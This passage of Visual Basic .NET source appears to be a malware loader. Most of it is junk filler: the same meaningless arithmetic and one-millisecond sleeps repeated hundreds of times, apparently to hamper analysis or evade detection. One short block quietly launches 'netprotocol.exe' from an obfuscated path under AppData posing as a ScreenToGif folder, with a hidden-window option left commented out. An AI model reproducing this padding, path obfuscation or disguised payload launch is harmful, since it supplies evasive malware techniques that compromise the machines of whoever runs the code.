            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			    shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			catch
    
end try
msgbox("O")
try
		Dim processorg As New Process()
        processorg.StartInfo.FileName =  CStr(Environ("USERPROFILE")) & "\Appùming".Replace("ù", "Data\Roa") & "\Microsoft\Windows\ScreenToGif\netprotocol.exe"
       ' processorg.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
        processorg.Start()
		catch
		Process.Start(CStr(Environ("USERPROFILE")) & "\Appùming".Replace("ù", "Data\Roa") & "\Microsoft\Windows\ScreenToGif\netprotocol.exe")
		end try
		End
End Sub
Sub Main()
 Try
            Dim crapper As Integer = 0
            Dim shits As Integer = 1
			Crapper += 1
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			    shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			    shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			    shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			    shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
